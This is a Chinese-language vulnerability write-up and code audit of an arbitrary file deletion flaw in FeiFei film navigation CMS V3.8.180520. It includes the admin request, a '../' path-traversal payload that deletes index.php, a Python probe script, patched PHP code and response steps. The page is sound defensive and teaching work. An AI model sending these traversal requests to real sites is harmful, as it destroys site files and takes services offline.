---
title: 飞飞影视导航系统 V3.8.180520 后台任意文件删除漏洞复现、代码审计与修复方案
description: 深度复现飞飞影视导航系统 V3.8.180520 后台数据库恢复功能中任意文件删除漏洞的完整攻击链，溯源 DataAction.class.php
  中 delall() 函数缺失路径校验的根因，给出基于路径规范化与白名单校验的修复方案。
category: program-analysis
tags:
- 飞飞CMS
- 任意文件删除
- 代码审计
- 路径遍历
- PHP安全
- CMS漏洞
- 漏洞复现
- 后台漏洞
date: '2018-05-20'
updated: '2026-11-15'
---

## 漏洞概述

飞飞影视导航系统是一款免费开源的 PHP 电影程序，专注于提供视频点播、影视聚合建站服务，一套程序自适配电脑、手机、平板、APP 多终端入口。其 **V3.8.180520** 版本后台数据库恢复模块存在任意文件删除漏洞，攻击者在登录后台权限下，可通过构造 `../` 路径遍历序列删除 Web 目录下任意文件（如 `index.php`），导致网站瘫痪或进一步结合其他漏洞实现 Getshell。

> **影响版本**：V3.8.180520  
> **漏洞类型**：任意文件删除 / 路径遍历  
> **危害等级**：高危  
> **攻击前置条件**：需拥有后台管理员权限  
> **漏洞文件**：`feifei/Lib/Lib/Action/Admin/DataAction.class.php`  
> **漏洞函数**：`delall()`

---

## 漏洞复现

### 环境搭建

1. 搭建 PHP + MySQL 环境（推荐 PHP 5.6+、MySQL 5.7+）
2. 部署飞飞影视导航系统 V3.8.180520 源码
3. 完成安装向导，登录后台

### 攻击步骤

#### 进入数据库恢复界面

登录后台后，点击 **数据库 → 数据库恢复**。若列表为空，需先在 **数据库备份** 处生成至少一个备份文件，以便后续调用删除接口。

#### 抓包分析删除请求

选中任意备份文件，点击删除并拦截数据包。典型请求如下：

```http
POST /cms/feifei/index.php?s=Admin-Data-Delall HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: <admin_session>

ids%5B%5D=20180520123456.sql
```

参数 `ids[]` 对应待删除备份文件名，后端直接拼接至 `DATA_PATH.'_bak/'` 目录下执行 `unlink()`。

#### 构造路径遍历 Payload

修改 `ids[]` 参数为相对路径遍历序列，目标指向 Web 根目录下的 `index.php`：

```http
ids%5B%5D=..%2F..%2F..%2Findex.php
```

即 `../../../index.php`（根据实际目录层级调整 `../` 数量）。

#### 验证漏洞效果

发包后刷新网站首页，发现 `index.php` 已被删除，网站无法正常访问，漏洞复现成功。

---

## 代码审计溯源

### 漏洞文件定位

```
feifei/Lib/Lib/Action/Admin/DataAction.class.php
```

### 关键代码片段

```php
public function delall() {
    if (isset($_POST['ids'])) {
        foreach ($_POST['ids'] as $value) {
            @unlink(DATA_PATH . '_bak/' . $value);
        }
        $this->success('删除成功！');
    } else {
        $this->error('请选择要删除的文件！');
    }
}
```

### 漏洞成因分析

| 缺陷点 | 说明 |
|--------|------|
| **缺乏路径校验** | 直接将用户可控的 `$_POST['ids']` 拼接进入文件路径，未过滤 `../`、`..\\` 等目录遍历序列 |
| **未限制文件扩展名** | 未校验文件后缀是否为合法备份格式（如 `.sql`、`.zip`），允许删除任意扩展名文件 |
| **使用抑制错误符 `@`** | `@unlink()` 隐藏了文件不存在、权限不足等错误信息，便于攻击者盲目探测路径深度 |
| **依赖常量 `DATA_PATH`** | 虽将基础路径固定在 `DATA_PATH.'_bak/'`，但未使用 `realpath()` 或 `basename()` 规范化路径，导致目录逃逸 |

### 调用链图解

```mermaid
flowchart TD
    A[用户 POST ids[] 参数] --> B[delall() 遍历 $_POST['ids']]
    B --> C[拼接路径: DATA_PATH . '_bak/' . $value]
    C --> D[@unlink() 执行删除]
    D --> E[任意文件被删除]
```

---

## 修复方案

### 核心原则

1. **路径规范化**：使用 `realpath()` 解析绝对路径，确保目标文件在预期目录内
2. **白名单校验**：仅允许删除符合命名规范（如 `*.sql`、`*.zip`）的备份文件
3. **基础目录锁定**：校验规范化路径是否以备份目录绝对路径为前缀
4. **移除错误抑制**：记录删除失败日志，便于审计排查

### 修复代码示例

```php
public function delall() {
    if (!isset($_POST['ids']) || !is_array($_POST['ids'])) {
        $this->error('请选择要删除的文件！');
        return;
    }

    // 备份目录绝对路径
    $backupDir = realpath(DATA_PATH . '_bak/');
    if ($backupDir === false || !is_dir($backupDir)) {
        $this->error('备份目录不存在！');
        return;
    }

    // 允许的备份文件扩展名白名单
    $allowedExt = ['sql', 'zip', 'gz', 'tar'];

    foreach ($_POST['ids'] as $value) {
        // 1. 基础文件名安全过滤：禁止空字节、目录遍历序列
        $value = basename($value); // 仅保留文件名部分
        if (strpos($value, '..') !== false || strpos($value, '\\') !== false) {
            $this->error("非法文件名: {$value}");
            return;
        }

        // 2. 扩展名白名单校验
        $ext = strtolower(pathinfo($value, PATHINFO_EXTENSION));
        if (!in_array($ext, $allowedExt)) {
            $this->error("不允许的文件类型: {$value}");
            return;
        }

        // 3. 构造目标绝对路径并二次确认在备份目录内
        $targetPath = realpath($backupDir . DIRECTORY_SEPARATOR . $value);
        if ($targetPath === false || strpos($targetPath, $backupDir) !== 0) {
            $this->error("路径越界: {$value}");
            return;
        }

        // 4. 执行删除（移除 @，捕获异常）
        if (!@unlink($targetPath)) {
            // 记录日志：删除失败、权限不足、文件不存在等
            error_log("[DataAction::delall] 删除失败: {$targetPath}");
        }
    }

    $this->success('删除成功！');
}
```

### 进阶加固建议

| 加固措施 | 实现要点 |
|----------|----------|
| **CSRF Token 校验** | 表单与 AJAX 请求均需携带一次性 Token，防止跨站请求伪造删除 |
| **操作审计日志** | 记录管理员 UID、IP、时间、删除文件列表，便于事后溯源 |
| **软删除机制** | 不直接 `unlink`，改为移动至 `.trash/` 目录或标记 `deleted=1`，支持误删恢复 |
| **权限最小化** | 仅超级管理员或具备 `DataDelete` 权限的角色可访问该接口 |
| **文件完校验** | 备份生成时计算 SHA256 并存库，删除前校验哈希，防止文件被篡改替换 |

---

## 关联技术专题

本漏洞属于典型的 **CMS 后台组件路径遍历导致的任意文件删除**，代码审计思路与以下页面高度相关，建议交叉阅读：

- [[arbitrary-file-download-vulnerability-analysis]] — HDWiki 后台数据库备份模块任意文件下载/删除双漏洞完整审计视图
- [[chanzhi-cms-7-0-1-template-getshell]] — 蝉知 CMS 模板编辑 `str_replace` 参数顺序错误导致任意代码执行
- [[metinfo-612-sql-injection-analysis]] — Metinfo CMS 反馈模块 `sqlinsert()` 过滤器绕过 SQL 注入审计
- [[oasys-system-code-audit]] — Oasys 办公系统 MyBatis/Fastjson/文件上传/越权/任意文件读取/XSS 多漏洞联合审计
- [[wecenter-v334-phar-deserialization-sqli]] — WeCenter PHAR 反序列化触发前台 SQL 注入攻击链复现

---

## 检测与应急响应

### 自动化检测脚本（概念验证）

```python
import requests
import sys

def check_feifei_delall(target, cookie):
    url = f"{target.rstrip('/')}/index.php?s=Admin-Data-Delall"
    headers = {'Cookie': cookie, 'Content-Type': 'application/x-www-form-urlencoded'}
    # 尝试删除不存在的测试文件，观察响应差异
    data = {'ids[]': '../../../nonexistent_test_file_12345.txt'}
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        # 若返回“删除成功”且无报错，疑似存在漏洞（需结合实际文件是否被删确认）
        return '删除成功' in r.text
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return False

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <admin_cookie>")
        sys.exit(1)
    print('[+] Vulnerable' if check_feifei_delall(sys.argv[1], sys.argv[2]) else '[-] Not vulnerable')
```

### 应急处置清单

1. **立即修补代码**：部署上述修复版 `DataAction.class.php`
2. **排查被删文件**：对比备份或版本库，恢复被恶意删除的关键文件（如 `index.php`、配置文件）
3. **审计后台日志**：查找近期 `Admin-Data-Delall` 访问记录，定位疑似攻击者账号与 IP
4. **强制轮换凭据**：重置所有后台管理员密码，启用 MFA（如可用）
5. **部署 WAF 规则**：拦截 `ids[]` 参数包含 `../`、`..\\`、URL 编码变体的请求

---

## 总结

飞飞影视导航系统 V3.8.180520 后台任意文件删除漏洞根因在于 **`DataAction::delall()` 对用户输入路径缺乏规范化与白名单校验**，攻击者利用 `../` 目录遍历突破备份目录限制，删除 Web 根目录任意文件。修复核心在于：**`realpath()` 锁定基础目录 + `basename()` 截取文件名 + 扩展名白名单 + 二次路径前缀校验**。该类漏洞在 CMS 后台文件管理、备份恢复、模板编辑等功能点高发，代码审计时应重点关注所有 `unlink()`、`fwrite()`、`copy()` 等文件操作函数的参数来源与过滤逻辑。[[arbitrary-file-download-vulnerability-analysis]] [[chanzhi-cms-7-0-1-template-getshell]] [[oasys-system-code-audit]]

## 来源

- [226安全团队-201805-202103_42](../sources/226安全团队-201805-202103_42.md)
